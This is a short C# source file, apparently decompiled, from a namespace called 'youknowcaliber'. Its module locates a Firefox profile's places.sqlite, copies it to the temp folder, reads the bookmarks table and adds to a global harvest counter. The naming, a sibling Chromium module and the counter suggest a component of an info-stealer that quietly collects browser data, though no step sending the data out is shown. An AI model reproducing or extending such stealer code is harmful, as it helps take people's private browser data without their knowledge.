﻿using System;
using System.Collections.Generic;
using System.IO;
using youknowcaliber.Chromium;

namespace youknowcaliber.Bookmarks
{
	internal class cBookmarks
	{
		private static string GetBookmarksDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				bool flag = Directory.Exists(path2);
				if (flag)
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						bool flag2 = File.Exists(str + "\\places.sqlite");
						if (flag2)
						{
							return str + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		public static List<Bookmark> Get(string path)
		{
			List<Bookmark> list = new List<Bookmark>();
			try
			{
				string bookmarksDBPath = cBookmarks.GetBookmarksDBPath(path);
				bool flag = !File.Exists(bookmarksDBPath);
				if (flag)
				{
					return list;
				}
				string text = Path.GetTempPath() + "\\places.raw";
				bool flag2 = File.Exists(text);
				if (flag2)
				{
					File.Delete(text);
				}
				File.Copy(bookmarksDBPath, text);
				SQLite sqlite = new SQLite(text);
				sqlite.ReadTable("moz_bookmarks");
				bool flag3 = sqlite.GetRowCount() == 65536;
				if (flag3)
				{
					return new List<Bookmark>();
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Bookmark item = default(Bookmark);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 5));
					bool flag4 = Crypto.GetUTF8(sqlite.GetValue(i, 1)).Equals("0") && item.sTitle != "0";
					if (flag4)
					{
						Counting.Bookmarks++;
						list.Add(item);
					}
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Bookmark>();
		}
	}
}
